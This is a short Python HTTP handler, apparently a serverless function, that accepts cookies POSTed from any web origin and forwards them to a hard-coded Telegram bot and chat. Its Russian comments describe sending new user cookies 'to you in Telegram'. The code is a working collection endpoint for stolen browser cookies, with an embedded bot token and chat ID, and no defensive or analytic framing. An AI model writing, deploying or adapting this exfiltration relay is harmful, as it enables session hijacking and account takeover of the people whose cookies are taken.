import os
import json
import urllib.request
from http.server import BaseHTTPRequestHandler

BOT_TOKEN = "8852972862:AAGurFT-AySvmqqJoGxpOgCizRm4n86XDso"
CHAT_ID = "8438889071"

class handler(BaseHTTPRequestHandler):
    def _send(self, code, payload):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(payload).encode())

    def do_OPTIONS(self):
        self._send(204, {})

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length).decode("utf-8")
            body = json.loads(raw)
            cookies = body.get("cookies", "")
            
            if not cookies:
                return self._send(400, {"error": "No cookies"})

            # Отправляем куки тебе в Telegram
            text = f"📥 Новые куки от пользователя:\n\n`{cookies[:2000]}...`"
            data = json.dumps({
                "chat_id": CHAT_ID,
                "text": text,
                "parse_mode": "MarkdownV2"
            }).encode("utf-8")
            
            req = urllib.request.Request(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data=data, headers={"Content-Type": "application/json"}, method="POST"
            )
            
            with urllib.request.urlopen(req, timeout=10) as r:
                return self._send(200, {"status": "ok"})
                
        except Exception as e:
            return self._send(500, {"error": str(e)})
